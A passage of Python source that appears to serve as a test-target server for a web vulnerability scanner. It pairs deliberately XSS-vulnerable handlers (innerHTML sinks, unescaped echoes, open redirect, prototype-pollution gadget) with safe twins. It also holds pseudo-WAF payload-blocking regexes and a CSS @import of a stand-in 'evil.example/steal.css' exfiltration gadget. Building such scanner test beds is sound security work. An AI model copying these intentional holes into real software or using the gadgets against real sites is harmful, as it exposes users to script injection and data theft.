            boundary = part.split("=", 1)[1].strip().strip('"')
            break
    if not boundary or not body:
        return []
    try:
        msg = _email.message_from_bytes(
            b"MIME-Version: 1.0\r\n"
            b"Content-Type: multipart/form-data; boundary="
            + boundary.encode("utf-8", "replace") + b"\r\n\r\n" + body)
    except Exception:
        return []
    out = []
    for part in msg.walk():
        if part.is_multipart():
            continue
        name = part.get_param("name", header="content-disposition")
        if not name:
            continue
        fname = part.get_filename()
        try:
            payload = part.get_payload(decode=True)
            value = payload.decode("utf-8", "replace") \
                if isinstance(payload, bytes) else str(payload)
        except Exception:
            value = ""
        out.append((name, value, fname))
    return out


def _parse_post_body(content_type: str, body: bytes) -> tuple:
    """Return (fields, files) for a POST body.

    fields: {name: value}; files: {field: filename}
    """
    ct = (content_type or "").lower()
    text = body.decode("utf-8", "replace") if body else ""
    if "multipart/form-data" in ct:
        fields, files = {}, {}
        for name, value, fname in _parse_multipart_parts(content_type, body):
            if fname:
                files[name] = fname
            else:
                fields[name] = value
        return fields, files
    if "json" in ct:
        try:
            obj = json.loads(text)
            if isinstance(obj, dict):
                return {str(k): ("" if v is None else str(v))
                        for k, v in obj.items()}, {}
        except Exception:
            pass
        return {}, {}
    try:
        return {k: v[0] for k, v in parse_qs(text,
                                             keep_blank_values=True).items()}, {}
    except Exception:
        return {}, {}


def m_stored_write(v: str, ctx: dict) -> tuple:
    """Vulnerable: store the submitted value verbatim."""
    _STORE.setdefault(ctx.get("path") or "", []).append(v)
    return _page(f"<div>Saved: {v}</div>")


def m_stored_write_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: store the HTML-escaped value."""
    _STORE.setdefault(ctx.get("path") or "", []).append(
        html.escape(v, quote=True))
    return _page(f"<div>Saved: {html.escape(v, quote=True)}</div>")


def m_stored_view(v: str, ctx: dict) -> tuple:
    """Vulnerable: render every stored entry for this view's inject path."""
    key = VIEW_TO_INJECT.get(ctx.get("path") or "", "")
    items = _STORE.get(key, [])
    body = "".join(f"<li>{x}</li>" for x in items) or "<li>(empty)</li>"
    return _page(f"<ul>{body}</ul>")


def m_upload_echo(v: str, ctx: dict) -> tuple:
    """Vulnerable: echo the uploaded FILENAME raw."""
    fname = (ctx.get("files") or {}).get(ctx.get("field") or "", "")
    return _page(f"<div>Uploaded file: {fname}</div>")


def m_upload_echo_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: same echo, HTML-escaped."""
    fname = (ctx.get("files") or {}).get(ctx.get("field") or "", "")
    return _page(f"<div>Uploaded file: {html.escape(fname, quote=True)}</div>")


def m_json_echo(v: str, ctx: dict) -> tuple:
    """Echo a JSON field back raw (JSON-body reflection, POST)."""
    val = (ctx.get("fields") or {}).get(ctx.get("field") or "q", "")
    return _page(f'<div>{"status": "ok", "echo": "{val}"}</div>')


def m_jsonct_raw(v: str, ctx: dict) -> tuple:
    """JSON-shaped body served as REAL ``application/json``, echoing raw.

    Note what every other JSON-ish handler here does: it returns through
    ``_page()``, which forces ``Content-Type: text/html``.  A reflection in one
    of those IS in an HTML context and really is exploitable -- so until this
    pair existed, no case ever exercised scanner.py's Phase 32 content-type
    branch, even though the layer matrix read 50/50 (layer coverage is not
    branch coverage).

    Markup inside a JSON body does not execute in a browser tab.  The engine
    keeps the finding for the record and drops it to low confidence, so this
    case locks THAT behaviour deliberately: it asserts "reported, at low
    confidence", not "exploitable".
    """
    val = (ctx.get("fields") or {}).get(ctx.get("field") or "q", "") or v
    return (200, {"Content-Type": "application/json; charset=utf-8"},
            json.dumps({"status": "ok", "echo": val}))


def m_jsonct_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: same JSON response, markup escaped to \\u003c / \\u003e.

    ``json.dumps`` escapes quotes but NOT angle brackets, so it cannot serve
    as the safe twin on its own -- both halves would be byte-identical and the
    pair would prove nothing.  A real API that treats the value as data
    escapes the brackets; doing so here removes the one premise this layer
    keys on (the payload appearing verbatim in the response).
    """
    val = (ctx.get("fields") or {}).get(ctx.get("field") or "q", "") or v
    val = val.replace("<", "\\u003c").replace(">", "\\u003e")
    return (200, {"Content-Type": "application/json; charset=utf-8"},
            json.dumps({"status": "ok", "echo": val}))


# ---------------------------------------------------------------------------
# Phase 152: SPA-shaped stored XSS.  The write endpoint accepts form-encoded
# AND JSON bodies (_parse_post_body handles both).  The VIEW page never
# contains the stored value in its HTML -- it fetches a JSON list endpoint
# client-side and inserts the entries with innerHTML (vuln) / textContent
# (safe twin).  That is the shape HTTP-text persistence verification cannot
# confirm (OWASP Juice Shop: POST /api/Feedbacks renders only inside the
# authenticated /#/administration route) and only the real-browser DOM
# engine can detect.
# ---------------------------------------------------------------------------

def m_stored_api_write(v: str, ctx: dict) -> tuple:
    """Store the submitted value verbatim (form or JSON body)."""
    _STORE.setdefault(ctx.get("path") or "", []).append(v)
    return _page(f"<div>Saved: {v}</div>")


def m_stored_api_write_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: store the HTML-escaped value."""
    _STORE.setdefault(ctx.get("path") or "", []).append(
        html.escape(v, quote=True))
    return _page(f"<div>Saved: {html.escape(v, quote=True)}</div>")


def m_stored_api_list(v: str, ctx: dict) -> tuple:
    """JSON list of stored entries (what the SPA viewer XHRs)."""
    key = ctx.get("path") or ""
    if key.endswith("/list"):
        key = key[:-len("/list")]
    items = _STORE.get(key, [])
    return (200, {"Content-Type": "application/json; charset=utf-8"},
            json.dumps(items))


def m_stored_user_write(v: str, ctx: dict) -> tuple:
    """User-write shape (Phase 153, Juice Shop POST /api/Users): a
    register/profile API that REJECTS a POST without companion fields --
    the payload rides in ``email`` but ``password`` must be present, so a
    single-field submission can never complete a write (measured live:
    scan_stored_dom needed --stored-extra to close the loop here)."""
    fields = ctx.get("fields") or {}
    if not fields.get("password"):
        return (400, {"Content-Type": "text/plain; charset=utf-8"},
                "password required")
    _STORE.setdefault(ctx.get("path") or "", []).append(v)
    return _page("<div>User created</div>")


def m_stored_user_write_escaped(v: str, ctx: dict) -> tuple:
    """Safe twin: companion fields demanded AND the email HTML-escaped."""
    fields = ctx.get("fields") or {}
    if not fields.get("password"):
        return (400, {"Content-Type": "text/plain; charset=utf-8"},
                "password required")
    _STORE.setdefault(ctx.get("path") or "", []).append(
        html.escape(v, quote=True))
    return _page("<div>User created</div>")


def m_stored_api_view(v: str, ctx: dict) -> tuple:
    """Vulnerable SPA viewer: fetched entries inserted via innerHTML."""
    list_url = (ctx.get("path") or "")[:-len("/view")] + "/list"
    return _page_raw(f"""<!DOCTYPE html><html><body>
<div id="feed"></div>
<script>
fetch('{list_url}').then(function(r){{return r.json();}}).then(function(items){{
  var out = '';
  for (var i = 0; i < items.length; i++) {{ out += '<li>' + items[i] + '</li>'; }}
  document.getElementById('feed').innerHTML = out;
}});
</script>
</body></html>""")


def m_stored_api_view_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: the identical SPA viewer written with textContent."""
    list_url = (ctx.get("path") or "")[:-len("/view")] + "/list"
    return _page_raw(f"""<!DOCTYPE html><html><body>
<div id="feed"></div>
<script>
fetch('{list_url}').then(function(r){{return r.json();}}).then(function(items){{
  var el = document.getElementById('feed');
  for (var i = 0; i < items.length; i++) {{
    var p = document.createElement('p');
    p.textContent = items[i];
    el.appendChild(p);
  }}
}});
</script>
</body></html>""")


POST_MODES: dict = {
    "stored_write": m_stored_write,
    "stored_write_escaped": m_stored_write_escaped,
    "stored_view": m_stored_view,
    "stored_api_write": m_stored_api_write,
    "stored_api_write_escaped": m_stored_api_write_escaped,
    "stored_api_user_write": m_stored_user_write,
    "stored_api_user_write_escaped": m_stored_user_write_escaped,
    "stored_api_list": m_stored_api_list,
    "stored_api_view": m_stored_api_view,
    "stored_api_view_safe": m_stored_api_view_safe,
    "upload_echo": m_upload_echo,
    "upload_echo_escaped": m_upload_echo_escaped,
    "json_echo": m_json_echo,
    # Phase 176g: the only pair whose response is REAL application/json.  All
    # the other JSON-shaped handlers go through _page() and are text/html.
    "jsonct_raw": m_jsonct_raw,
    "jsonct_escaped": m_jsonct_escaped,
}

MODES_CTX: dict = {
    # Phase 172: this pair's reflection depends on the scanner actually
    # sending a LATE injectable header (see m_late_header_reflect above).
    "late_header_reflect": m_late_header_reflect,
    "late_header_reflect_escaped": m_late_header_reflect_escaped,
    "cookie_echo": m_cookie_echo,
    "cookie_echo_escaped": m_cookie_echo_escaped,
    # Phase 176f: the cookie-tossing pair.  Needs a genuine parent/child host
    # pair, which the manifest case supplies with host=sub.localhost -- see the
    # handler docstrings for why that works without DNS.
    "cookie_toss_parent": m_cookie_toss_parent,
    "cookie_toss_self": m_cookie_toss_self,
    "path_echo": m_path_echo,
    "path_echo_escaped": m_path_echo_escaped,
    "error_echo": m_error_echo,
    "error_echo_escaped": m_error_echo_escaped,
    "cors_reflect": m_cors_reflect,
    "cors_whitelist": m_cors_whitelist,
    "markdown_raw": m_markdown_raw,
    "markdown_filtered": m_markdown_filtered,
}

# ---------------------------------------------------------------------------
# Phase 113: page-analysis targets for four layers that had zero coverage.
#
# Their layer functions take (scanner, url, html) -- pure source analysis --
# so the target just contains the pattern they look for:
#   open redirect  -- a redirect sink fed by a redirect parameter
#   prototype      -- recursive merge next to a jQuery-style sink gadget
#   service worker -- serviceWorker.register(<user input>)
#   web worker     -- new Worker(<user input>)
# Each has a safe twin keeping the shape but removing the user-controlled
# flow, so a layer grepping only for the API name fails one of the pair.
# ---------------------------------------------------------------------------

def m_redirect_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: redirect sink driven by the `redirect` parameter."""
    return _page(
        "<a href='/go?redirect=/home'>Home</a><script>"
        "var target = new URLSearchParams(location.search).get('redirect');"
        "if (target) { location.href = target; }"
        "</script>")


def m_redirect_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: same sink, fixed destination."""
    return _page(
        "<a href='/go?redirect=/home'>Home</a>"
        "<script>location.href = '/home';</script>")


_PROTO_MERGE = (
    "<div id='out'></div><script>"
    "function deepMerge(target, src) {"
    " for (var key in src) {"
    "  if (typeof src[key] === 'object' && src[key] !== null) {"
    "   target[key] = target[key] || {};"
    "   deepMerge(target[key], src[key]);"
    "  } else { target[key] = src[key]; }"
    " }"
    " return target;"
    "}"
)


def m_prototype_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: recursive merge + jQuery .html(prop) gadget."""
    return _page(_PROTO_MERGE +
                 "var cfg = JSON.parse(location.hash.slice(1) || '{}');"
                 "var opts = deepMerge({}, cfg);"
                 "$('#out').html(opts.html);</script>")


def m_prototype_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: same merge, sink is .text() (no gadget)."""
    return _page(_PROTO_MERGE +
                 "var cfg = JSON.parse(location.hash.slice(1) || '{}');"
                 "var opts = deepMerge({}, cfg);"
                 "$('#out').text(opts.text);</script>")


def m_sw_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: service worker registered from a query parameter."""
    return _page(
        "<script>"
        "var p = new URLSearchParams(location.search).get('sw');"
        "navigator.serviceWorker.register(p || '/sw.js');"
        "</script>")


def m_sw_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: fixed script URL."""
    return _page("<script>navigator.serviceWorker.register('/sw.js');"
                 "</script>")


def m_worker_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: worker URL taken from a query parameter."""
    return _page(
        "<script>"
        "var w = new URLSearchParams(location.search).get('w');"
        "if (w) { new Worker(w); }"
        "</script>")


def m_worker_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: fixed worker URL."""
    return _page("<script>new Worker('/w.js');</script>")


PAGE_MODES: dict = {
    "redirect_vuln": m_redirect_vuln,
    "redirect_safe": m_redirect_safe,
    "prototype_vuln": m_prototype_vuln,
    "prototype_safe": m_prototype_safe,
    "sw_vuln": m_sw_vuln,
    "sw_safe": m_sw_safe,
    "worker_vuln": m_worker_vuln,
    "worker_safe": m_worker_safe,
}

# ---------------------------------------------------------------------------
# Phase 116: six more source-analysis targets.
#
# Same recipe as Phase 113 (which found a systematic FP in redirect, and
# after which sw/worker/dom turned out to share the root cause): build a
# pair per layer where only the user-controlled flow differs.
# ---------------------------------------------------------------------------

def m_css_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: the parameter lands INSIDE the CSS (url())."""
    return _page(f'<style>.x{{background:url("{v}")}}</style>'
                 '<div>styled</div>')


def m_css_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: the CSS is fixed, the reflection is OUTSIDE it."""
    return _page('<style>.x{background:url(/bg.png)}</style>'
                 f'<div>{v}</div>')


def m_dangling_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: a CSRF token value reflects unescaped -- a quote breaks
    out of the attribute and starts a dangling-markup injection."""
    return _page('<form action="/go"><input type="hidden" '
                 f'name="csrf_token" value="{v}"></form>')


def m_dangling_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: same form and same reflection, but NO hidden sensitive
    value -- _HIDDEN_INPUT_VALUE_RE matches any hidden input and
    _CSRF_TOKEN_RE matches csrf-ish names, so the twin uses a visible
    text field with an ordinary name.  Without sensitive data there is
    nothing to exfiltrate."""
    return _page('<form action="/go"><input type="text" '
                 f'name="page" value="{html.escape(v, quote=True)}">'
                 '</form>')


def m_importmap_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: the import map maps a module to a user-supplied URL."""
    return _page(
        '<script type="importmap">'
        '{"imports":{"app":"https://cdn.example/' + v + '"}}'
        '</script><script type="module">import "app";</script>')


def m_importmap_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: fixed, SAME-origin module URL (the violation the layer
    reports here is cross-origin mapping, so the twin must not map
    cross-origin at all)."""
    return _page(
        '<script type="importmap">'
        '{"imports":{"app":"/static/app.js"}}'
        '</script><script type="module">import "app";</script>')


def m_sri_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: third-party script with NO integrity attribute."""
    return _page('<script src="https://cdn.example/lib.js"></script>'
                 f'<div>{v}</div>')


def m_sri_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: same third-party script, integrity + crossorigin.

    Phase 136: the reflected value is escaped.  This twin used to interpolate
    it RAW into the div, so the page was a plain XSS while being labelled
    `safe` -- the engine's `reflected` finding was CORRECT and the LABEL was
    wrong.  A twin's "safe" premise must be the single property under test
    (here: SRI present), not "and also no trivial injection".
    """
    return _page('<script src="https://cdn.example/lib.js" '
                 'integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/'
                 'uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" '
                 'crossorigin="anonymous"></script>'
                 f'<div>{html.escape(v or "")}</div>')


def m_tt_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: a Trusted Types policy that passes HTML through."""
    return _page(
        "<script>"
        "trustedTypes.createPolicy('p', {createHTML: (s) => s});"
        f"document.getElementById('o').innerHTML = '{v}';"
        "</script><div id='o'></div>")


def _js_string_literal(v: str) -> str:
    """JS string literal for an inline <script> block (Phase 136).

    Two encodings are needed, not one:
      * ``json.dumps`` -- escapes the quote/backslash so the value cannot
        break out of the JS STRING;
      * ``<`` -> ``\\u003c`` -- json.dumps does NOT touch angle brackets, so
        a value containing ``</script`` would still terminate the SCRIPT
        BLOCK in the HTML parser no matter how well the string is quoted.
        Both twins missed the second one, and the engine's
        ``script_string_*`` payloads (``"></script><script>...``) were
        perfectly correct to confirm.
    """
    return json.dumps(v or "").replace("<", "\\u003c").replace(">", "\\u003e")


def m_tt_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: policy sanitises instead of passing through.

    Phase 136: the value is encoded for an inline JS string (see
    ``_js_string_literal``).  It used to sit raw between single quotes, so
    `';alert(1);//` broke out of the string and ran -- the engine's
    confirmation was CORRECT and this twin was mislabelled `safe`.
    """
    return _page(
        "<script>"
        "trustedTypes.createPolicy('p', {createHTML: (s) => s.replace("
        "/</g, '&lt;')});"
        f"document.getElementById('o').innerHTML = "
        f"{_js_string_literal(v)};"
        "</script><div id='o'></div>")


def m_ws_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: WebSocket endpoint taken from a query parameter and the
    message is written with innerHTML."""
    return _page(
        "<script>"
        "var ep = new URLSearchParams(location.search).get('ws');"
        "var ws = new WebSocket(ep);"
        "ws.onmessage = function(e) { document.body.innerHTML = e.data; };"
        "</script>")


def m_ws_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: fixed endpoint, textContent sink."""
    return _page(
        "<script>"
        "var ws = new WebSocket('wss://example.test/socket');"
        "ws.onmessage = function(e) { document.body.textContent = e.data; };"
        "</script>")


PAGE_MODES.update({
    "css_vuln": m_css_vuln,
    "css_safe": m_css_safe,
    "dangling_vuln": m_dangling_vuln,
    "dangling_safe": m_dangling_safe,
    "importmap_vuln": m_importmap_vuln,
    "importmap_safe": m_importmap_safe,
    "sri_vuln": m_sri_vuln,
    "sri_safe": m_sri_safe,
    "tt_vuln": m_tt_vuln,
    "tt_safe": m_tt_safe,
    "ws_vuln": m_ws_vuln,
    "ws_safe": m_ws_safe,
})

# ---------------------------------------------------------------------------
# Phase 117: sanitizer_bypass + graphql targets.
# ---------------------------------------------------------------------------

def m_sanitizer_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: an outdated DOMPurify whose output goes to innerHTML."""
    return _page(
        '<script src="https://cdn.jsdelivr.net/npm/dompurify@1.0.1'
        '/dist/purify.min.js" integrity="sha384-StZ3bcNoOOoHLWVB6OrOBue+0sluGaVMG6kHIs17IjHyqhhiotZI/ZPZfMww8Ycc"'
        ' crossorigin="anonymous"></script>'
        '<div id="o"></div><script>'
        'document.getElementById("o").innerHTML = '
        f'DOMPurify.sanitize("{v}");'
        '</script>')


def m_sanitizer_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: current version AND the sanitised output goes to a
    non-sink (textContent).  (The layer flags any sanitise->innerHTML
    flow, so changing only the version would still report.)

    Phase 136: the value is encoded for an inline JS string (see
    ``_js_string_literal``).  It used to sit raw between double quotes, so a
    `"` -- or, more decisively, a `</script>` -- broke out and ran: the
    engine's `script_string_dq` confirmation was CORRECT.
    """
    return _page(
        '<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6'
        '/dist/purify.min.js" integrity="sha384-aLMwkQFyLD6+QVnoIOJGuXs+fPHjPoUIQb8fAOr1UQgiuhDRImXlHZJEUS8ki3WD"'
        ' crossorigin="anonymous"></script>'
        '<div id="o"></div><script>'
        'document.getElementById("o").textContent = '
        f'DOMPurify.sanitize({_js_string_literal(v)});'
        '</script>')


def m_graphql_vuln(v: str, ctx: dict) -> tuple:
    """Vulnerable: GraphQL response data rendered with innerHTML."""
    return _page(
        '<div id="o"></div><script>'
        'fetch("/graphql", {method:"POST", headers:{"Content-Type":'
        '"application/json"}, body: JSON.stringify({query:'
        '"query { user { name } }"})})'
        '.then(r => r.json())'
        '.then(d => { document.getElementById("o").innerHTML = '
        'd.data.user.name; });'
        '</script>')


def m_graphql_safe(v: str, ctx: dict) -> tuple:
    """Safe twin: same query, textContent sink."""
    return _page(
        '<div id="o"></div><script>'
        'fetch("/graphql", {method:"POST", headers:{"Content-Type":'
        '"application/json"}, body: JSON.stringify({query:'
        '"query { user { name } }"})})'
        '.then(r => r.json())'
        '.then(d => { document.getElementById("o").textContent = '
        'd.data.user.name; });'
        '</script>')


PAGE_MODES.update({
    "sanitizer_vuln": m_sanitizer_vuln,
    "sanitizer_safe": m_sanitizer_safe,
    "graphql_vuln": m_graphql_vuln,
    "graphql_safe": m_graphql_safe,
})


# ---------------------------------------------------------------------------
# Phase 118: pseudo-WAF targets (L2_waf_evade).
# ---------------------------------------------------------------------------

# Headers that make the scanner classify the target as WAF-guarded.
_WAF_HEADERS = {
    "Server": "cloudflare",
    "CF-RAY": "7c1f2e3a4b5c6d7e-SJC",
}

_WAF_NAIVE_BLOCKS = ("<script", "<svg onload=")
# Phase 119: block the CLASS, not a list.  The old enumeration missed
# ontoggle/onanimationend/etc; a payload that got through was echoed and
# the engine reported it correctly, which my manifest then scored as a
# false positive.  A strict WAF stops tag injection outright.
_WAF_STRICT_PATTERNS = (
    r"<\s*[a-z!/]",        # any tag open, incl. </x and <!doctype
    r"<\s*%",               # encoded tag starts (<% ...)
    r"on[a-z]+\s*=",        # any event handler, spaces tolerated
    r"javascript\s*:",
    r"data\s*:\s*text/html",
    r"&#x?0*3c;?",          # &#60; / &#x3C;
    r"%3c|\\u003c",        # percent- and JS-escaped '<'
)

_WAF_BLOCK_PAGE = (
    "<!DOCTYPE html><html><head><title>Attention Required!</title></head>"
    "<body><h1>Sorry, you have been blocked</h1>"
    "<p>Cloudflare Ray ID: 7c1f2e3a4b5c6d7e</p></body></html>"
)


def _waf_blocked(value: str, needles) -> bool:
    """``needles`` may be plain substrings (naive WAF) or regexes
    (prefixed 're:' -- strict WAF)."""
    low = unquote(value or "").lower()
    for n in needles:
        if n.startswith("re:"):
            if re.search(n[3:], low):
                return True
        elif n in low:
            return True
    return False


def _waf_respond(value: str, needles):
    """403 + Cloudflare headers when blocked, else a raw echo page."""
    if _waf_blocked(value, needles):
        hdrs = dict(_WAF_HEADERS)
        hdrs["Content-Type"] = "text/html; charset=utf-8"
        return 403, hdrs, _WAF_BLOCK_PAGE
    # Raw echo: whatever survives the WAF is reflected verbatim.
    return _page(f"<!-- Cloudflare Ray ID: 7c1f2e3a4b5c6d7e -->"
                 f"<div>{value}</div>", dict(_WAF_HEADERS))


def m_waf_naive(v: str, ctx: dict) -> tuple:
    """Vulnerable: a naive rule set -- escalation past it still lands."""
    return _waf_respond(v, _WAF_NAIVE_BLOCKS)


def m_waf_strict(v: str, ctx: dict) -> tuple:
    """Safe twin: tag injection is blocked outright, so no finding."""
    return _waf_respond(v, tuple("re:" + p for p in _WAF_STRICT_PATTERNS))


PAGE_MODES.update({
    "waf_naive": m_waf_naive,
    "waf_strict": m_waf_strict,
})


# ---------------------------------------------------------------------------
# Phase 120: crawl-discovered targets (L9_form_miner / L9_js_miner).
#
# The landing pages below reflect NOTHING and link to nothing; the echo
# endpoints are reachable only by mining the form action / the inline JS.
# ---------------------------------------------------------------------------

def m_crawl_form_vuln(v: str, ctx: dict) -> tuple:
    """Landing page: one form pointing at a raw-echo endpoint."""
    return _page('<h1>Survey</h1>'
                 '<form action="/r/formecho01" method="GET">'
                 '<input type="text" name="q" value="">'
                 '<button type="submit">Send</button></form>')


def m_crawl_form_safe(v: str, ctx: dict) -> tuple:
    """Same shape, endpoint escapes its output."""
    return _page('<h1>Survey</h1>'
                 '<form action="/s/formecho01" method="GET">'
                 '<input type="text" name="q" value="">'
                 '<button type="submit">Send</button></form>')


def m_crawl_js_vuln(v: str, ctx: dict) -> tuple:
    """Landing page: the endpoint exists only inside inline JS."""
    return _page('<div id="out">loading</div><script>'
                 'function load(x) {'
                 '  fetch("/r/jsecho01?q=" + encodeURIComponent(x))'
                 '    .then(r => r.text()).then(t => {'
                 '      document.getElementById("out").innerHTML = t; });'
                 '}'
                 'load("home");'
                 '</script>')


def m_crawl_js_safe(v: str, ctx: dict) -> tuple:
    return _page('<div id="out">loading</div><script>'
                 'function load(x) {'
                 '  fetch("/s/jsecho01?q=" + encodeURIComponent(x))'
                 '    .then(r => r.text()).then(t => {'
                 '      document.getElementById("out").textContent = t; });'
                 '}'
                 'load("home");'
                 '</script>')


def m_formecho_raw(v: str, ctx: dict) -> tuple:
    """Vulnerable echo endpoint (reached by the crawler, not by a link)."""
    return _page(f"<div>results for {v}</div>")


def m_formecho_safe(v: str, ctx: dict) -> tuple:
    return _page(f"<div>results for {html.escape(v, quote=True)}</div>")


# ---------------------------------------------------------------------------
# Phase 121: hidden-parameter miner targets (L9_param_miner).
#
# The page carries NO UI hint for the `name` parameter -- no form field,
# no link, no inline JS references it, and the manifest cases pin
# param:"" so the scan URL arrives clean.  The only way the scanner can
# learn that `name` exists is param_miner probing (candidate #8, inside
# the 14-candidate budget that max_payloads=14 implies).  Registered in
# MODES_CTX (not PAGE_MODES) because PAGE_MODES handlers only see the
# one pinned param -- these need the full query dict to pick up whatever
# the miner appended.
# ---------------------------------------------------------------------------

def m_pm_vuln(v: str, ctx: dict) -> tuple:
    """Hidden `name` param reflected into a JS string sink."""
    name_val = ((ctx.get("query") or {}).get("name") or [""])[0]
    if name_val:
        return _page("<h1>Profile</h1>"
                     f'<script>var profile = "{name_val}";</script>')
    return _page("<h1>Profile</h1><p>No profile selected.</p>")


def m_pm_safe(v: str, ctx: dict) -> tuple:
    """Same page; hidden param accepted but echoed escaped into text."""
    name_val = ((ctx.get("query") or {}).get("name") or [""])[0]
    if name_val:
        return _page("<h1>Profile</h1>"
                     f"<p>Showing {html.escape(name_val, quote=True)}.</p>")
    return _page("<h1>Profile</h1><p>No profile selected.</p>")


# ---------------------------------------------------------------------------
# Phase 122a: CSS injection targets (L7_css_injection).
#
# The layer is PURE static page analysis (analyze_page on the response
# HTML, no payload involvement) -- so the target is a static page whose
# stylesheet itself carries an exfiltration gadget.  No reflection, no
# parameters (param:"" -> clean URL).  The earlier "the layer can never
# fire in this pipeline" note was WRONG: it fired the param-marker
# reasoning at a page-level layer.
#
# Phase 140 correction: "the page ships a gadget" is not "the page is
# exploitable".  The old vuln target was a plain static @import with no
# user input anywhere -- byte-for-byte the shape of a page legitimately
# loading a CDN stylesheet (Google Fonts emits @font-face + unicode-range
# + external src:url()).  Scanned against OWASP Juice Shop that rule
# produced a *high* false positive while both real XSS went unreported.
# CSSI is, by this module's own definition, "attacker-controlled input
# placed into a CSS context" -- so the gadget must be user-controlled.
# The template variable keeps it a static, parameterless page (pure static
# analysis still finds it) while making the CSS context genuinely
# attacker-controlled.
# ---------------------------------------------------------------------------

def m_cssi_vuln(v: str, ctx: dict) -> tuple:
    """Static page whose <style> interpolates a template var into @import."""
    return _page("<h1>Theme demo</h1>"
                 "<style>@import url(https://evil.example/steal.css"
                 "?theme={{user_theme}});</style>"
                 "<p>Custom theme preview.</p>")


def m_cssi_safe(v: str, ctx: dict) -> tuple:
    """Same shape; the stylesheet is fully self-contained."""
    return _page("<h1>Theme demo</h1>"
                 "<style>.theme-box{color:#333;padding:8px;}</style>"
                 "<p>Custom theme preview.</p>")


def m_cssi_gfonts_safe(v: str, ctx: dict) -> tuple:
    """Phase 140: an ordinary page loading a real CDN webfont.

    Not a vulnerability -- nothing here is attacker-controlled.  This is
    the regression guard for the false positive seen on OWASP Juice Shop:
    a page using Google Fonts emits exactly the @font-face + unicode-range
    + external src:url() gadget shape.
    """
    return _page(
        "<h1>Shop</h1>"
        "<style>"
        "@font-face{font-family:'VT323';font-style:normal;font-weight:400;"
        "font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/"
        "pxiKyp0ihIEF2isfFJU.woff2) format('woff2');"
        "unicode-range:U+0102-0103,U+0110-0111;}"
        "body{font-family:'VT323',monospace}"
        "</style>"
        "<p>Welcome to the shop.</p>")


# ---------------------------------------------------------------------------
# Phase 122b: pre-encoded container targets (L1_pre_encoded).
#
# The scanner only runs this layer when the parameter's ORIGINAL value
# parses as a structured container (json_b64 / jwt -- detect_structure).
# The manifest cases pin param_value to a base64-JSON blob so the scan
# URL arrives as ?data=eyJwYWdlIjoicHJvZmlsZSJ9 ("{"page":"profile"}").
# The app decodes the container and echoes the DECODED string raw
# (vuln) / escaped (safe).  Values that do not decode fall back to
# echoing the raw value (vuln) or the escaped raw value (safe) -- which
# is what makes the scanner's own markers reflect so the param pipeline
# reaches the pre-encode check at all.
# ---------------------------------------------------------------------------

def _pe_decode(v: str) -> str:
    """Best-effort base64 decode (matches the app's lenient decoder)."""
    try:
        raw = base64.b64decode(v + "=" * (-len(v) % 4))
        return raw.decode("utf-8")
    except Exception:
        return ""


def m_pe_vuln(v: str, ctx: dict) -> tuple:
    decoded = _pe_decode(v)
    shown = decoded if decoded else v
    return _page("<h1>Settings</h1>"
                 f'<div class="profile">Profile: {shown}</div>')


def m_pe_safe(v: str, ctx: dict) -> tuple:
    decoded = _pe_decode(v)
    shown = decoded if decoded else v
    return _page("<h1>Settings</h1>"
                 '<div class="profile">Profile: '
                 f'{html.escape(shown, quote=True)}</div>')


# ---------------------------------------------------------------------------
# Phase 122c: position-shift targets (L2_position_shift).
#
# Phase 33 fires ONLY when (a) a WAF is detected, (b) nothing confirmed,
# (c) the marker was NOT escaped, and (d) payloads are then re-fired in
# the OTHER parameter location.  Shape: a POST endpoint behind a pseudo
# WAF that inspects the BODY only.  The app echoes the body value raw
# (so the marker reflects unescaped and the payload loop runs), the
# loop payloads are all 406'd by the WAF, and the shift re-fires the
# top payloads into the QUERY -- the WAF blind spot -- where the app
# echoes them raw (vuln) / escaped (safe).  Needs ctx["query"], which
# do_POST now provides (Phase 122).
# ---------------------------------------------------------------------------

def _pshift_render(body_val: str, query_val: str, escape_query: bool) -> tuple:
    q_out = (html.escape(query_val, quote=True) if escape_query
             else query_val)
    body = ""
    if body_val:
        body += f'<div id="feed">{body_val}</div>'
    if query_val:
        body += f'<div id="search">Results for {q_out}</div>'
    if not body:
        body = "<p>Nothing posted yet.</p>"
    page = ("<!DOCTYPE html><html><head><title>Feed</title></head>"
            f"<body><h1>Feed</h1>{body}</body></html>")
    headers = {"Content-Type": "text/html; charset=utf-8", **_WAF_HEADERS}
    return (200, headers, page)


def m_pshift_vuln(v: str, ctx: dict) -> tuple:
    body_val = (ctx.get("fields") or {}).get("q", "")
    if _waf_blocked(body_val,
                    ["re:" + p for p in _WAF_STRICT_PATTERNS]):
        return (406, {**_WAF_HEADERS,
                      "Content-Type": "text/html; charset=utf-8"},
                _WAF_BLOCK_PAGE)
    query_val = ((ctx.get("query") or {}).get("q") or [""])[0]
    return _pshift_render(body_val, query_val, escape_query=False)


def m_pshift_safe(v: str, ctx: dict) -> tuple:
